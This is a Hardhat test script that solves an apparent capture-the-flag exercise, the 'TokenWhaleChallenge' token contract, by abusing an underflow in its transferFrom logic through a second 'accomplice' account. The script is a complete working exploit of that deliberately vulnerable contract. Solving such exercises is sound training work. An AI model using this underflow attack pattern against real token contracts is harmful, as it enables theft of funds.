import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let contract: Contract; // challenge contract
let contractAccomplice: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, accomplice] = accounts.slice(0, 2);
  const challengeFactory = await ethers.getContractFactory(
    "TokenWhaleChallenge"
  );
  contract = challengeFactory.attach(
    `0xEcF35a2266BCd5dd1aA6061350F6ef20f508d2bC`
  );
  contractAccomplice = contract.connect(accomplice);

  // transfer some funds to accomplice
  if ((await accomplice.getBalance()).lt(ethers.utils.parseEther(`0.1`))) {
    tx = eoa.sendTransaction({
      to: await accomplice.getAddress(),
      value: ethers.utils.parseEther(`0.1`),
    });
  }
});

it("solves the challenge", async function () {
  const eoaAddress = await eoa.getAddress();
  const accompliceAddress = await accomplice.getAddress();

  console.log(`Checking eoaAddress balance ... ${eoaAddress}`);
  expect(await contract.balanceOf(eoaAddress)).to.be.gte(
    BigNumber.from(`1000`)
  );

  console.log(`Approving accomplice ...`);
  tx = await contract.approve(accompliceAddress, BigNumber.from(`2`).pow(`255`));
  await tx.wait()

  console.log(`Transfering to self signed by accomplice ...`);
  // it uses three vars: from, to, msg.sender
  // msg.sender shouldn't be used at all and makes the overflow exploit possible
  tx = await contractAccomplice.transferFrom(eoaAddress, eoaAddress, `1`);
  await tx.wait();
  // accomplice has huge amount of tokens now
  console.log(`Checking accomplice balance ...`);
  expect(await contract.balanceOf(accompliceAddress)).to.be.gte(
    BigNumber.from(`1000000`)
  );

  console.log(`Transfering funds to eoa ...`);
  tx = await contractAccomplice.transfer(eoaAddress, `1000000`);
  await tx.wait();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
